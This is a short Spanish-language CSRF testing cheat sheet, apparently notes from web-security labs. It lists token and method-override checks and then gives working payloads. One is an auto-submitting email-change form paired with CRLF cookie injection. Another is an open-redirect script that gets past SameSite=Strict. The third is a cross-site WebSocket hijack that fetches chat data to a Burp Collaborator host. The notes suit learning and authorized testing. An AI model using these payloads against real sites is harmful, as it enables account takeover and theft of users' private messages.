--  -
## **Cosas a testear**
1. Ver si borrando el csrf token se puede de igual manera modificar los campos CRUD.
2. Cambiar el metodo utilizado y agregar un **`&_method=POST`** para ver de engañar al servidor y sobreescribir el metodo.
3. Probar reutilizando el token de otro usuario sin haber sido utilizado previamente.



--- -
## **Payloads**
- Intentamos cargar una imagen la cual intenta hacer un search para así setear como cookie un csrfkey valido y la cookie Samesite=None para que no joda con el tema de los dominios cruzados. La carga de esa imagen va a generar un error, por lo que en ese error subimos el form con todo ya seteado previamente.
```html
<form action="https://URL/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="kike@kike.com" />
    <input type="hidden" name="csrf" value="YuqS3GNMMQ4pMjgJueYf1S5GdHgGV4E3" />
    <input type="submit" value="Submit request" />
</form>

<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=BfSlrsokL2VXRM9P5dfS58XmlkZG9Hzp%3b%20Samesite=None" onerror="document.forms[0].submit();">
```

- Aprovechando de un open-redirect para bypassear la restriccion Samesite=Strict
```html
<script>
    location="https://URL/post/comment/confirmation?postId=../my-account/change-email%3femail=juansero@kike.com%26submit=1";
</script>
```

- Exfiltracion de datos mediante el uso de websockets
```javascript
<script>
	var ws = new WebSocket("https://URL/chat");
	
	ws.onopen = function() {
	    ws.send("READY");
	};
	
	ws.onmessage = function(info) {
		    fetch("https://BURP-COLLABORATOR/?data=" + btoa(info.data));
	};
</script>
```